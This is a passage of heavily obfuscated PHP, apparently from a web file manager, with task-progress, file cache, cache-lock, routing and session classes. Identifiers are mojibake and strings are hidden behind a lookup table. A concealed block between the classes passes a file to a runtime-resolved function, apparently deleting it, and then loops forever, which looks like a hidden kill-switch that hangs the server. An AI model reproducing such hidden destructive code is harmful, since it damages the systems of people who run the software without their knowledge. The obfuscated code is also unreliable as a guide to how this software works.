$œâ¤øüÑ) { return; } if (substr($ÑÀ¥“©Â, 0, strlen($œâ¤øüÑ)) == $œâ¤øüÑ) { return; } $–öä…¯õ =& $this->task; $–öä…¯õ[$šğáÊÃù[1832]] = KodIO::transferType($Ç•¼, $»Ã²ä±ş); $this->update(); } public function updateAfter() { $ïØ©˜½· =& $_SERVER[Š—Â“œÔ]; $Ü–¼ø» =& $this->task; if (!$Ü–¼ø»[$ïØ©˜½·[830]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Ü–¼ø»[$ïØ©˜½·[1832]] == $ïØ©˜½·[1400]) { return; } self::updateTask($Ü–¼ø»); } private static function updateTask(&$©éİüìé) { $ç§ı…ã =& $_SERVER[Š—Â“œÔ]; if ($©éİüìé[$ç§ı…ã[1832]] == $ç§ı…ã[1276] || $©éİüìé[$ç§ı…ã[1832]] == $ç§ı…ã[110]) { if ($©éİüìé[$ç§ı…ã[1826]]) { $©éİüìé[$ç§ı…ã[1829]] = $©éİüìé[$ç§ı…ã[1828]] + $©éİüìé[$ç§ı…ã[1825]]; } } else { if ($©éİüìé[$ç§ı…ã[1832]] == $ç§ı…ã[1401]) { if ($©éİüìé[$ç§ı…ã[1826]] == $ç§ı…ã[1276]) { $©éİüìé[$ç§ı…ã[1829]] = $©éİüìé[$ç§ı…ã[1828]] + $©éİüìé[$ç§ı…ã[1825]] * 0.5; } else { if ($©éİüìé[$ç§ı…ã[1826]] == $ç§ı…ã[110]) { $©éİüìé[$ç§ı…ã[1829]] = $©éİüìé[$ç§ı…ã[1828]] + $©éİüìé[$ç§ı…ã[1824]] * 0.5 + $©éİüìé[$ç§ı…ã[1825]] * 0.5; } } } } $©éİüìé[$ç§ı…ã[1772]] = $©éİüìé[$ç§ı…ã[1829]] / $©éİüìé[$ç§ı…ã[830]]; if ($©éİüìé[$ç§ı…ã[1772]] > 0) { $×ïÓ²ë£ = timeFloat() - $©éİüìé[$ç§ı…ã[1774]] - $©éİüìé[$ç§ı…ã[1777]]; $©éİüìé[$ç§ı…ã[1778]] = $×ïÓ²ë£ * (1 - $©éİüìé[$ç§ı…ã[1772]]) / $©éİüìé[$ç§ı…ã[1772]]; } } public function addPath($‡¯ååı) { $ãÀçë­· =& $_SERVER[Š—Â“œÔ]; if (!$‡¯ååı) { return; } $”ş·“Ñí =& $this->task; $ÚñÜ¿ô = IO::infoWithChildren($‡¯ååı); $ÈË ˜Ö® = $”ş·“Ñí[$ãÀçë­·[1833]] ? $”ş·“Ñí[$ãÀçë­·[1833]][$ãÀçë­·[1834]] : 0; $”ş·“Ñí[$ãÀçë­·[1833]] = array($ãÀçë­·[1834] => $ÈË ˜Ö® + 1, $ãÀçë­·[496] => $ÚñÜ¿ô[$ãÀçë­·[32]], $ãÀçë­·[87] => $ÚñÜ¿ô[$ãÀçë­·[87]], $ãÀçë­·[584] => $ÚñÜ¿ô[$ãÀçë­·[584]] ? $ÚñÜ¿ô[$ãÀçë­·[584]] : $ÚñÜ¿ô[$ãÀçë­·[87]]); if ($ÚñÜ¿ô[$ãÀçë­·[33]] == $ãÀçë­·[232]) { $”ş·“Ñí[$ãÀçë­·[1137]] += 1; } else { $”ş·“Ñí[$ãÀçë­·[1137]] += $ÚñÜ¿ô[$ãÀçë­·[82]][$ãÀçë­·[80]]; if ($ÚñÜ¿ô[$ãÀçë­·[193]]) { $”ş·“Ñí[$ãÀçë­·[1137]] += $ÚñÜ¿ô[$ãÀçë­·[82]][$ãÀçë­·[81]] + 1; } } $”ş·“Ñí[$ãÀçë­·[830]] += $ÚñÜ¿ô[$ãÀçë­·[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¨Ùº‚’È) { } public function sourceAddHashEnd($åÌ‹×²Ê) { } public function sourceAddFileStart($Î®‚²çê) { $™ÍËÓ’ï =& $_SERVER[Š—Â“œÔ]; $°±îóôÄ =& $this->task; $°±îóôÄ[$™ÍËÓ’ï[1824]] = $Î®‚²çê[$™ÍËÓ’ï[79]]; $°±îóôÄ[$™ÍËÓ’ï[1822]] = $Î®‚²çê[$™ÍËÓ’ï[32]]; $°±îóôÄ[$™ÍËÓ’ï[1139]] = $Î®‚²çê[$™ÍËÓ’ï[32]]; $°±îóôÄ[$™ÍËÓ’ï[1835]] = $Î®‚²çê[$™ÍËÓ’ï[87]]; $this->update(); } public function sourceAddFileEnd($ŸöÊşµ–) { $«ßèè·´ =& $_SERVER[Š—Â“œÔ]; $ÒäèÕ— =& $this->task; $ÒäèÕ—[$«ßèè·´[1829]] += $ŸöÊşµ–[$«ßèè·´[79]]; $ÒäèÕ—[$«ßèè·´[1835]] = $ŸöÊşµ–[$«ßèè·´[87]]; $this->update(1); } public function copyFileStart($ÑÜ±ôãÖ, $õÍšåÏº, $ÎÊ§£Â¤, $¶ßÅì¸¨, $áÅ’Õº, $‰Ï¶“) { $×âìğï =& $_SERVER[Š—Â“œÔ]; $É«¹¶šî = $áÅ’Õº; if ($É«¹¶šî == $GLOBALS[$×âìğï[1836]]) { $É«¹¶šî = $GLOBALS[$×âìğï[1837]]; } $GLOBALS[$×âìğï[1837]] = $áÅ’Õº; $GLOBALS[$×âìğï[1836]] = $‰Ï¶“; $“ìöì‘° =& $this->task; $“ìöì‘°[$×âìğï[1822]] = $É«¹¶šî; $“ìöì‘°[$×âìğï[1824]] = (int) $ÑÜ±ôãÖ->size($õÍšåÏº); $“ìöì‘°[$×âìğï[1825]] = 0; $“ìöì‘°[$×âìğï[1139]] = $×âìğï[12]; $“ìöì‘°[$×âìğï[1826]] = $×âìğï[12]; $“ìöì‘°[$×âìğï[1827]] = 0; $Û‚â‚ó¸ = $“ìöì‘°[$×âìğï[1824]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($“ìöì‘°[$×âìğï[477]] . $×âìğï[1838]); if ($Û‚â‚ó¸ && file_exists(get_path_father($¶ßÅì¸¨))) { Cache::set($“ìöì‘°[$×âìğï[477]] . $×âìğï[1838], $¶ßÅì¸¨); $“ìöì‘°[$×âìğï[1795]] = array($×âìğï[1839], $×âìğï[1840]); } $this->update(0, $Û‚â‚ó¸); } public static function updateCopyLocalFileSize($‹Î¶±˜) { $ïğÎšŒ =& $_SERVER[Š—Â“œÔ]; $“òÏÒ† = Cache::get($‹Î¶±˜[$ïğÎšŒ[477]] . $ïğÎšŒ[1838]); if (!$“òÏÒ† || !file_exists($“òÏÒ†)) { return $‹Î¶±˜; } $‹Î¶±˜[$ïğÎšŒ[1825]] = @filesize($“òÏÒ†); $‹Î¶±˜[$ïğÎšŒ[1829]] += $‹Î¶±˜[$ïğÎšŒ[1825]]; self::updateTask($‹Î¶±˜); return $‹Î¶±˜; } public function copyFileEnd($Î„íÃâñ, $ÔàŒ˜ , $»ò½¸ì¦, $ˆû‘«åŸ, $Œè…éó, $È•İÆ¤) { $–Êô—üŠ =& $_SERVER[Š—Â“œÔ]; $Å’ÚçÀÀ =& $this->task; $Å’ÚçÀÀ[$–Êô—üŠ[1825]] = $Å’ÚçÀÀ[$–Êô—üŠ[1824]]; $Å’ÚçÀÀ[$–Êô—üŠ[1826]] = $–Êô—üŠ[12]; unset($Å’ÚçÀÀ[$–Êô—üŠ[1795]]); if ($Œè…éó == $Å’ÚçÀÀ[$–Êô—üŠ[1822]]) { $Å’ÚçÀÀ[$–Êô—üŠ[1828]] += $Å’ÚçÀÀ[$–Êô—üŠ[1824]]; $Å’ÚçÀÀ[$–Êô—üŠ[1829]] = $Å’ÚçÀÀ[$–Êô—üŠ[1828]]; $˜½Ã¬’¥ = 1; if (isset($Å’ÚçÀÀ[$–Êô—üŠ[1835]]) && $Å’ÚçÀÀ[$–Êô—üŠ[1835]] == $ÔàŒ˜ ) { $˜½Ã¬’¥ = 0; } $this->update($˜½Ã¬’¥); } else { $this->update(); $Å’ÚçÀÀ[$–Êô—üŠ[1825]] = 0; } Cache::remove($Å’ÚçÀÀ[$–Êô—üŠ[477]] . $–Êô—üŠ[1838]); self::log($–Êô—üŠ[1841] . $ÔàŒ˜  . $–Êô—üŠ[73] . $ˆû‘«åŸ . $–Êô—üŠ[287] . $Œè…éó . $–Êô—üŠ[1842] . $Å’ÚçÀÀ[$–Êô—üŠ[1822]]); } public function updateFileEnd($Ö®ªæÛÁ, $À¶ìşşû) { $Êêº©õ =& $_SERVER[Š—Â“œÔ]; $Ã¡ÔçàŒ =& $this->task; $Ã¡ÔçàŒ[$Êêº©õ[1822]] = $Ö®ªæÛÁ; $Ã¡ÔçàŒ[$Êêº©õ[1824]] = $À¶ìşşû; $Ã¡ÔçàŒ[$Êêº©õ[1828]] += $À¶ìşşû; $Ã¡ÔçàŒ[$Êêº©õ[1829]] = $Ã¡ÔçàŒ[$Êêº©õ[1828]]; $this->update(1); self::log($Êêº©õ[1843] . $Ö®ªæÛÁ); } public function sourceModelCopy($±öÊ±ëÀ) { $Úƒ°…ä– =& $_SERVER[Š—Â“œÔ]; $ßìšÓ­Ä = $±öÊ±ëÀ[0]; $ŒåõÄÓ = $±öÊ±ëÀ[1]; $‚ğşúõø =& $this->task; $this->sourceModelCopyFlag = !0; $ûÑ‰¯ş› = 0; switch ($ßìšÓ­Ä) { case $Úƒ°…ä–[640]: $ûÑ‰¯ş› = 1; break; case $Úƒ°…ä–[643]: $‚ğşúõø[$Úƒ°…ä–[1822]] = $ŒåõÄÓ[$Úƒ°…ä–[32]]; break; case $Úƒ°…ä–[645]: $ûÑ‰¯ş› = intval($±öÊ±ëÀ[$Úƒ°…ä–[458]] * 0.4); break; case $Úƒ°…ä–[647]: $ûÑ‰¯ş› = intval($±öÊ±ëÀ[$Úƒ°…ä–[458]] * 0.2); break; case $Úƒ°…ä–[649]: $ûÑ‰¯ş› = intval($±öÊ±ëÀ[$Úƒ°…ä–[458]] * 0.4); break; } $this->update($ûÑ‰¯ş›); $this->sourceModelCopyFlag = !1; } public function sourceRemove($‘×º™¯, $´¢Ï›İº) { $òò¨˜ÔÏ =& $_SERVER[Š—Â“œÔ]; $this->sourceModelCopyFlag = !0; $õ»¬æØ© = 1; if (isset($‘×º™¯[$òò¨˜ÔÏ[82]])) { $õ»¬æØ© = $‘×º™¯[$òò¨˜ÔÏ[82]][$òò¨˜ÔÏ[80]]; $õ»¬æØ© = $õ»¬æØ© + $‘×º™¯[$òò¨˜ÔÏ[82]][$òò¨˜ÔÏ[81]] + 1; } $this->update($õ»¬æØ©); $this->sourceModelCopyFlag = !1; } public function sourceMove($†¡ââ‚) { $this->sourceRemove($†¡ââ‚, !1); } public function curlProgress($¥öÖÙ¹Õ, $„ğïêî­, $ëÄå÷, $à¬¬í˜İ, $Ş‚¾€¿ò) { $¾ò€¶¥ù =& $_SERVER[Š—Â“œÔ]; $–ò¬ğ ‘ =& $this->task; if ($Ş‚¾€¿ò > 0) { $–ò¬ğ ‘[$¾ò€¶¥ù[1139]] = $¾ò€¶¥ù[1844]; $–ò¬ğ ‘[$¾ò€¶¥ù[1826]] = $¾ò€¶¥ù[110]; if ($–ò¬ğ ‘[$¾ò€¶¥ù[1824]]) { $–ò¬ğ ‘[$¾ò€¶¥ù[1825]] = $Ş‚¾€¿ò; } if ($–ò¬ğ ‘[$¾ò€¶¥ù[1827]]) { $–ò¬ğ ‘[$¾ò€¶¥ù[1825]] = $Ş‚¾€¿ò + $–ò¬ğ ‘[$¾ò€¶¥ù[1827]]; } } else { if ($ëÄå÷ > 0) { if ($–ò¬ğ ‘[$¾ò€¶¥ù[1824]] == $„ğïêî­) { $–ò¬ğ ‘[$¾ò€¶¥ù[1825]] = $ëÄå÷; $–ò¬ğ ‘[$¾ò€¶¥ù[1139]] = $¾ò€¶¥ù[1845]; $–ò¬ğ ‘[$¾ò€¶¥ù[1826]] = $¾ò€¶¥ù[1276]; } } } $this->update(); } public function curlProgressStart($¤ûÀÁ×õ) { } public function curlProgressEnd($µÓŒâğ) { $ª…Ãâ‹ =& $_SERVER[Š—Â“œÔ]; $î‘¿È =& $this->task; $Šå›¤„© = curl_getinfo($µÓŒâğ); $™–òô‰² = $Šå›¤„©[$ª…Ãâ‹[1846]]; if ($™–òô‰² == -1) { $™–òô‰² = $Šå›¤„©[$ª…Ãâ‹[1847]]; } if ($î‘¿È[$ª…Ãâ‹[1826]] == $ª…Ãâ‹[110] && $™–òô‰²) { $î‘¿È[$ª…Ãâ‹[1827]] += $™–òô‰²; } $this->update(); } } goto c¢¨²áéÎÃ; e¸öó‘†ËŞ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ƒÀ®ÁØ¡, $ë—×‹¦ã) { $œ³Çôİë =& $_SERVER[Š—Â“œÔ]; $this->cachePath = $ƒÀ®ÁØ¡[$œ³Çôİë[87]]; $this->prefix = $œ³Çôİë[902]; $this->cacheTime = $ë—×‹¦ã; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($úÊ´ñè) { $Äœ¦¨ =& $_SERVER[Š—Â“œÔ]; $úÊ´ñè = str_replace(array($Äœ¦¨[903], $Äœ¦¨[100], $Äœ¦¨[76]), $Äœ¦¨[904], $úÊ´ñè); return $this->cachePath . $Äœ¦¨[905] . $úÊ´ñè . $Äœ¦¨[906]; } public function set($¥Ãèş˜ß, $¤‹ØşÅÄ, $™‚ªäÆë = false) { $™‚ªäÆë = $™‚ªäÆë ? $™‚ªäÆë : $this->cacheTime; $ ç©¦Â = $this->getFile($¥Ãèş˜ß); if (file_put_contents($ ç©¦Â, $this->prefix . $¤‹ØşÅÄ, LOCK_EX)) { @touch($ ç©¦Â, intval(time() + $™‚ªäÆë)); clearstatcache(); return !0; } @unlink($ ç©¦Â); return !1; } public function get($—ìî¢Æ) { $÷·ŞôŠš = $this->getFile($—ìî¢Æ); if (file_exists($÷·ŞôŠš) && filemtime($÷·ŞôŠš) < time()) { @unlink($÷·ŞôŠš); return !1; } $¯í•È»à = @file_get_contents($÷·ŞôŠš); return substr($¯í•È»à, strlen($this->prefix)); } public function remove($÷ Ï¶ê) { $«ŒÅ¿§ = $this->getFile($÷ Ï¶ê); return @unlink($«ŒÅ¿§); } public function deleteAll() { $¦Ì„â”Ú =& $_SERVER[Š—Â“œÔ]; $éàşËúä = scandir($this->cachePath); foreach ($éàşËúä as $Õ÷õĞÉ–) { $Çåµ‚ö† = $this->cachePath . $Õ÷õĞÉ–; if (strpos($Çåµ‚ö†, $¦Ì„â”Ú[906]) && strpos($Çåµ‚ö†, $¦Ì„â”Ú[907])) { @unlink($Çåµ‚ö†); } } } public function clearTimeout() { $¡¼ÉÆ°– =& $_SERVER[Š—Â“œÔ]; $ş¹ÙĞÆ‡ = scandir($this->cachePath); foreach ($ş¹ÙĞÆ‡ as $‘¾¶ç€) { $ìçÛ½ëç = $this->cachePath . $‘¾¶ç€; if (strpos($ìçÛ½ëç, $¡¼ÉÆ°–[906]) && strpos($ìçÛ½ëç, $¡¼ÉÆ°–[907]) && filemtime($ìçÛ½ëç) < time()) { @unlink($ìçÛ½ëç); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $‡µ­ÚæÔ =& $_SERVER[Š—Â“œÔ]; if (self::$handle) { return self::$handle; } $ªŠòœÌù = $GLOBALS[$‡µ­ÚæÔ[6]][$‡µ­ÚæÔ[426]]; self::$timeout = $ªŠòœÌù[$‡µ­ÚæÔ[908]] ? $ªŠòœÌù[$‡µ­ÚæÔ[908]] : 10; $Ë¼…ô·ş = _get($GLOBALS[$‡µ­ÚæÔ[6]], $‡µ­ÚæÔ[909]); $ÊôÈøÜÖ = $ªŠòœÌù[$‡µ­ÚæÔ[894]] ? $ªŠòœÌù[$‡µ­ÚæÔ[894]] : $‡µ­ÚæÔ[232]; if ($ÊôÈøÜÖ == $‡µ­ÚæÔ[21] && $Ë¼…ô·ş == $‡µ­ÚæÔ[13]) { $ÊôÈøÜÖ = $‡µ­ÚæÔ[232]; } switch ($ÊôÈøÜÖ) { case $‡µ­ÚæÔ[897]: self::$handle = new CacheLockRedis(); break; case $‡µ­ÚæÔ[898]: self::$handle = new CacheLockMemcached(); break; case $‡µ­ÚæÔ[21]: self::$handle = new CacheLockDatabase(); break; case $‡µ­ÚæÔ[232]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($‡µ­ÚæÔ[910], $‡µ­ÚæÔ[911]); } return self::$handle; } private static function key($„»˜²) { return $_SERVER[Š—Â“œÔ][912] . Cache::key($„»˜²); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¥¸ñæÔ‘ = '') { self::$errorMsg = $¥¸ñæÔ‘; } public static function lockGlobal($ø„óÔÄ, $§¬çÙÇ) { return self::lock($ø„óÔÄ, $§¬çÙÇ, !0); } public static function lock($Ïô°ÒŞ›, $†ƒ™‚šˆ = false, $õ©Ş–Œë = false) { $Ë­ŞÕÎã =& $_SERVER[Š—Â“œÔ]; $½İÍ¿† = self::init(); $şÁšóÕß = self::key($Ïô°ÒŞ›); $†ƒ™‚šˆ = $†ƒ™‚šˆ ? $†ƒ™‚šˆ : self::$timeout; $Ú—°×£ = timeFloat(); if ($GLOBALS[$Ë­ŞÕÎã[913]]) { if (!$½İÍ¿†->lock($şÁšóÕß, 0.2)) { die; } return !0; } $€øˆıœÛ = $½İÍ¿†->lock($şÁšóÕß, $†ƒ™‚šˆ); $îçíîõ = timeFloat(); if (!$€øˆıœÛ) { $ş£ëåª¸ = "\154\x6f\143\x6b\40\145\162\162\157\x72\73\x6b\145\x79\75{$Ïô°ÒŞ›}\73\x74\151\x6d\145\75{$†ƒ™‚šˆ}\73" . self::$errorMsg . $Ë­ŞÕÎã[74] . get_caller_msg(); $¨×ì›î = LNG($Ë­ŞÕÎã[914]) . "\x28{$†ƒ™‚šˆ}\x73\x29\56" . LNG($Ë­ŞÕÎã[915]); $¨×ì›î .= $Ë­ŞÕÎã[916]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¨×ì›î = $¨×ì›î . $Ë­ŞÕÎã[917] . self::$errorMsg; } write_log($Ë­ŞÕÎã[918] . sprintf($Ë­ŞÕÎã[919], timeFloat() - $Ú—°×£) . $Ë­ŞÕÎã[920] . $ş£ëåª¸ . $Ë­ŞÕÎã[921] . json_encode(error_get_last()), $Ë­ŞÕÎã[911]); show_json($¨×ì›î, !1); } if (!$õ©Ş–Œë) { self::$lockItem[$şÁšóÕß] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ã±Œ®±« = number_format(timeFloat() - $îçíîõ, 3); write_log($Ë­ŞÕÎã[922] . $Ïô°ÒŞ› . $Ë­ŞÕÎã[923] . $ã±Œ®±«, $Ë­ŞÕÎã[911]); } return $€øˆıœÛ; } public static function lockGet($£ßÍí€) { $“ªã¡¦Š = self::key($£ßÍí€); if (self::$lockItem[$“ªã¡¦Š]) { return self::$lockItem[$“ªã¡¦Š]; } return self::init()->lockGet($“ªã¡¦Š); } public static function unlock($¶‘‹îæ) { $˜´‚Âõ =& $_SERVER[Š—Â“œÔ]; $ø»‘û¤ = self::key($¶‘‹îæ); self::$lockItem[$ø»‘û¤] = null; self::init()->unlock($ø»‘û¤); if (GLOBAL_DEBUG_LOG_ALL) { write_log($˜´‚Âõ[924] . $¶‘‹îæ, $˜´‚Âõ[911]); } return; } public static function unlockRuntime() { $¥”ÆºõÒ =& $_SERVER[Š—Â“œÔ]; $ü­ÑÃÉõ = self::init(); $ÖÈœıÙ’ = !1; foreach (self::$lockItem as $‹¶¼Êó± => $³ÄÒ§‡ü) { if (!$³ÄÒ§‡ü) { continue; } $ü­ÑÃÉõ->unlock($‹¶¼Êó±); if (!$ÖÈœıÙ’) { $ÖÈœıÙ’ = !0; write_log($¥”ÆºõÒ[925] . $‹¶¼Êó± . $¥”ÆºõÒ[74] . get_caller_msg(), $¥”ÆºõÒ[911]); continue; } write_log($¥”ÆºõÒ[925] . $‹¶¼Êó±, $¥”ÆºõÒ[911]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Óà¼¡¯ê = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¥”ÆºõÒ[926] . $Óà¼¡¯ê . $¥”ÆºõÒ[927] . ACTION, $¥”ÆºõÒ[911]); } } public static function fileLock($Ãƒóü¤‡) { $âÕ­Š™Œ =& $_SERVER[Š—Â“œÔ]; if (!$GLOBALS[$âÕ­Š™Œ[928]]) { $GLOBALS[$âÕ­Š™Œ[928]] = array(); } $GLOBALS[$âÕ­Š™Œ[928]][$Ãƒóü¤‡] = !1; $©ø•¨ÑŞ = fopen(DATA_PATH . $Ãƒóü¤‡ . $âÕ­Š™Œ[929], $âÕ­Š™Œ[930]); if (!$©ø•¨ÑŞ) { return !1; } $GLOBALS[$âÕ­Š™Œ[928]][$Ãƒóü¤‡] = $©ø•¨ÑŞ; if (flock($©ø•¨ÑŞ, LOCK_EX)) { return !0; } self::unlock($Ãƒóü¤‡); show_json($âÕ­Š™Œ[931], !1); return !1; } public static function fileUnlock($ï´çà¼µ) { $î¨™Ôºõ =& $_SERVER[Š—Â“œÔ]; $™ùá×… = $GLOBALS[$î¨™Ôºõ[928]][$ï´çà¼µ]; if (!$™ùá×…) { return; } $GLOBALS[$î¨™Ôºõ[928]][$ï´çà¼µ] = !1; flock($™ùá×…, LOCK_UN); fclose($™ùá×…); } public static function fileUnlockAll() { $Ì¾ÙÖ =& $_SERVER[Š—Â“œÔ]; if (!isset($GLOBALS[$Ì¾ÙÖ[928]]) || !$GLOBALS[$Ì¾ÙÖ[928]]) { return; } foreach ($GLOBALS[$Ì¾ÙÖ[928]] as $ªËŒìı => $’§ÏŒ†ô) { if (!$’§ÏŒ†ô) { continue; } $GLOBALS[$Ì¾ÙÖ[928]][$ªËŒìı] = !1; flock($’§ÏŒ†ô, LOCK_UN); fclose($’§ÏŒ†ô); } $GLOBALS[$Ì¾ÙÖ[928]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto B¸£‹Üî—ù; dŒˆ¸Òˆñ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\133\x5e\x2f\135\53", "\x3a\156\165\x6d" => "\133\60\x2d\71\135\x2b", "\72\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($åşı¢×½, $¹ì˜ËÔë) { $Ô«ğâ‰ =& $_SERVER[Š—Â“œÔ]; if ($åşı¢×½ == $Ô«ğâ‰[1705]) { $¤¾­•œª = array_map($Ô«ğâ‰[1706], $¹ì˜ËÔë[0]); $ëá§˜¸ì = strpos($¹ì˜ËÔë[1], $Ô«ğâ‰[8]) === 0 ? $¹ì˜ËÔë[1] : $Ô«ğâ‰[8] . $¹ì˜ËÔë[1]; $ˆ×ĞÃ®ç = $¹ì˜ËÔë[2]; } else { $¤¾­•œª = null; $ëá§˜¸ì = strpos($¹ì˜ËÔë[0], $Ô«ğâ‰[8]) === 0 ? $¹ì˜ËÔë[0] : $Ô«ğâ‰[8] . $¹ì˜ËÔë[0]; $ˆ×ĞÃ®ç = $¹ì˜ËÔë[1]; } array_push(self::$maps, $¤¾­•œª); array_push(self::$routes, $ëá§˜¸ì); array_push(self::$methods, strtoupper($åşı¢×½)); array_push(self::$callbacks, $ˆ×ĞÃ®ç); } public static function error($œì·¹µ) { self::$errorCallback = $œì·¹µ; } public static function haltOnMatch($İá˜åö€ = true) { self::$halts = $İá˜åö€; } public static function dispatch() { $Šéô¹¼… =& $_SERVER[Š—Â“œÔ]; $Êˆ®‡•æ = parse_url($_SERVER[$Šéô¹¼…[1707]], PHP_URL_PATH); $Û©ÎşÔ€ = $_SERVER[$Šéô¹¼…[164]]; $Ñ¼Ú¼ = array_keys(static::$patterns); $±àÈ÷À© = array_values(static::$patterns); $Ë‹‰¿œ¨ = !1; self::$routes = preg_replace($Šéô¹¼…[1359], $Šéô¹¼…[8], self::$routes); if (in_array($Êˆ®‡•æ, self::$routes)) { $ÏÊüùŸ— = array_keys(self::$routes, $Êˆ®‡•æ); foreach ($ÏÊüùŸ— as $¿ãÕãë½) { if (self::$methods[$¿ãÕãë½] == $Û©ÎşÔ€ || self::$methods[$¿ãÕãë½] == $Šéô¹¼…[1708] || in_array($Û©ÎşÔ€, self::$maps[$¿ãÕãë½])) { $Ë‹‰¿œ¨ = !0; if (!is_object(self::$callbacks[$¿ãÕãë½])) { $êöû–¯ = explode($Šéô¹¼…[8], self::$callbacks[$¿ãÕãë½]); $™ª¦¿âò = end($êöû–¯); $¼¢ï×Ä = explode($Šéô¹¼…[1290], $™ª¦¿âò); $‚ÛØÂ¦ = new $¼¢ï×Ä[0](); $‚ÛØÂ¦->{$¼¢ï×Ä[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¿ãÕãë½]); if (self::$halts) { return; } } } } } else { $Ä×£ÎÅ = 0; foreach (self::$routes as $¿ãÕãë½) { if (strpos($¿ãÕãë½, $Šéô¹¼…[4]) !== !1) { $¿ãÕãë½ = str_replace($Ñ¼Ú¼, $±àÈ÷À©, $¿ãÕãë½); } if (preg_match($Šéô¹¼…[1709] . $¿ãÕãë½ . $Šéô¹¼…[1710], $Êˆ®‡•æ, $ˆ¤ÆàŞ›)) { if (self::$methods[$Ä×£ÎÅ] == $Û©ÎşÔ€ || self::$methods[$Ä×£ÎÅ] == $Šéô¹¼…[1708] || !empty(self::$maps[$Ä×£ÎÅ]) && in_array($Û©ÎşÔ€, self::$maps[$Ä×£ÎÅ])) { $Ë‹‰¿œ¨ = !0; array_shift($ˆ¤ÆàŞ›); if (!is_object(self::$callbacks[$Ä×£ÎÅ])) { $êöû–¯ = explode($Šéô¹¼…[8], self::$callbacks[$Ä×£ÎÅ]); $™ª¦¿âò = end($êöû–¯); $¼¢ï×Ä = explode($Šéô¹¼…[1290], $™ª¦¿âò); $‚ÛØÂ¦ = new $¼¢ï×Ä[0](); if (!method_exists($‚ÛØÂ¦, $¼¢ï×Ä[1])) { echo $Šéô¹¼…[1711]; } else { call_user_func_array(array($‚ÛØÂ¦, $¼¢ï×Ä[1]), $ˆ¤ÆàŞ›); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Ä×£ÎÅ], $ˆ¤ÆàŞ›); if (self::$halts) { return; } } } } $Ä×£ÎÅ++; } } if ($Ë‹‰¿œ¨ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ãíÊ×›Ÿ =& $_SERVER[Š—Â“œÔ]; header($_SERVER[$ãíÊ×›Ÿ[1712]] . $ãíÊ×›Ÿ[1713]); echo $ãíÊ×›Ÿ[1714]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Šéô¹¼…[1707]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } if (!isset($_SERVER[$_SERVER[Š—Â“œÔ][947]]) || !isset($_SERVER[$_SERVER[Š—Â“œÔ][945]])) { $_getc = $_SERVER[Š—Â“œÔ][949]; $_getfile = $_SERVER[$_SERVER[Š—Â“œÔ][950]] . $_SERVER[Š—Â“œÔ][951]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Š—Â“œÔ][287], $_getfilec); if (count($_getarrs) < $_SERVER[Š—Â“œÔ][689]) { $exit = $_SERVER[Š—Â“œÔ][952]; $exit(); } $_act = $_SERVER[Š—Â“œÔ][1298]; $_act($_SERVER[$_SERVER[Š—Â“œÔ][950]] . $_SERVER[Š—Â“œÔ][951]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Š—Â“œÔ][456]); } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $šÄİóœ =& $_SERVER[Š—Â“œÔ]; static $Ò§ßÀ’Ğ = false; if ($Ò§ßÀ’Ğ) { return $Ò§ßÀ’Ğ; } $ñÕŠà–€ = $GLOBALS[$šÄİóœ[6]][$šÄİóœ[426]]; self::$sessionTime = $ñÕŠà–€[$šÄİóœ[1715]]; $¤ßúœŸ‘ = isset($GLOBALS[$šÄİóœ[1716]]) ? $GLOBALS[$šÄİóœ[1716]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¤ßúœŸ‘)) { self::$sessionSign = Cookie::get($¤ßúœŸ‘); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($¤ßúœŸ‘, self::$sessionSign, self::$sessionTime); $ä˜Ï˜ÅÖ = $ñÕŠà–€[$šÄİóœ[1717]]; $´âİºÉ = $ñÕŠà–€[$ä˜Ï˜ÅÖ]; $±‚å…¼® = $ñÕŠà–€[$šÄİóœ[895]]; switch ($ä˜Ï˜ÅÖ) { case $šÄİóœ[21]: self::$handle = Model($šÄİóœ[896]); break; case $šÄİóœ[897]: self::$handle = new CacheRedis($´âİºÉ, $±‚å…¼®); break; case $šÄİóœ[898]: self::$handle = new CacheMemcached($´âİºÉ, $±‚å…¼®); break; case $šÄİóœ[232]: $´âİºÉ[$šÄİóœ[87]] = $´âİºÉ[$šÄİóœ[87]] . $šÄİóœ[1718]; self::$handle = new CacheFile($´âİºÉ, $±‚å…¼®); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Ò§ßÀ’Ğ = new self(); return $Ò§ßÀ’Ğ; } public static function getBySign($Óˆ…é¬®) { $ŞÎ´¥È = self::$handle->get($Óˆ…é¬®); $ŞÎ´¥È = unserialize($ŞÎ´¥È); return is_array($ŞÎ´¥È) ? $ŞÎ´¥È : array(); } public static function setBySign($Ášø°Ã–, $…ßøâ—Â) { CacheLock::lock($Ášø°Ã–); 